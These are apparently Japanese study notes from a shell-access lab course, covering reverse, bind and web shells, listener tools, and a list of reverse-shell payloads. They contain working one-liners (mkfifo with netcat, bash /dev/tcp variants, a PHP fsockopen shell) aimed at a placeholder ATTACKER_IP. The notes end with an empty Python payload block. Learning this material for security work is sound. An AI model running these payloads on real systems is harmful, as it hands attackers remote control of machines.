- Room Introduction
	- Reverse Shell
		- 対象マシンから攻撃者へ接続
		- Firewallの内側から外へ接続させやすい
	- Bind Shell
		- 対象マシンが待ち受けて、攻撃者側から接続しに行く
	- Web Shell
		- HTTP経由で操作できるが、機能が限定的なことがある
- Shell Overview
	- ユーザーとOSとやり取りするためのソフトウェア
	- Remote System Control
	- Privilege Escalation
	- Data Exfiltration
	- Persistence and Maintenance Acess
		- back doorなど
	- Post-Exploitation Activities
	- Access Other Systems on the Network
		- pivoting
			- ほかのシステムに入る
- Reverse Shell
	- FIrewallを抜けやすい
	- 攻撃者側でNetcatで待ち受ける
		- ```
		  `nc -lvnp 443`.
		  ```
		- NetcatはTCPもしくはUDP接続などを利用して、コマンドラインからデータを送受信するためのツールです。
		- よく知られたポート番号を使用する
	- Pipe reverse shell
		```
		rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
		```
		- 攻撃者が入力したコマンド→nc経由で対象へ届く→/tmp/f を通って sh に入る→sh がコマンドを実行する→実行結果が nc 経由で攻撃者へ返る
		- /tmp/f
			- 使用するファイル
		- mkfifo
			- 名前付きパイプを使用するためのファイルを作成するコマンド
			- ncはつなぐだけで表示とかをやらないから別プロセスに渡すため
			- パイプ|は一回限り
		- sh -i 2>&1
			- 対話シェルを使うため、じゃないと
- Bind Shell
	- nc -l 0.0.0.0 8080
		- すべてのインターフェイスを使って8080でまつ
		- 1024未満のポートは管理者権限が必要となることが多い
	- 対象マシンのポートを開けなければいけない
		- ばれやすい
- Shell listener
	- rlwrap
		- ncを使いやすくする
	- ncat
		- sslなど使える
	- socat
		- TCP接続や標準出力など、いろいろな入出力を柔軟につなげるツール。
		- パイプがいらない
- Shell Payloads
	- Shell Payloadとは、対象マシンのShellをネットワーク越しに使えるようにするコマンドやスクリプト。
		1. 対象マシンから攻撃者IP:PORTへ接続する  
		2. shell、bash、shなどを起動する  
		3. shellの入力・出力・エラーをネットワーク接続につなぐ
	- Normal Bash Reverse Shell
		```
		bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
		```
	- Bash Read Line Reverse Shell
		```
		exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
		```
	- **Bash With File Descriptor 196** **Reverse Shell**
		```
		0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
		```
	- Bash with File Descriptor 5 Reverse Shell
		```
		bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
		```
	- PHP Reverse Shell
		```
		php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
		```
		- exec
		- shell_exec
		- system
		- passthru
		- popen
	- **Python Reverse Shell by Exporting Environment Variables**
		```
		
		```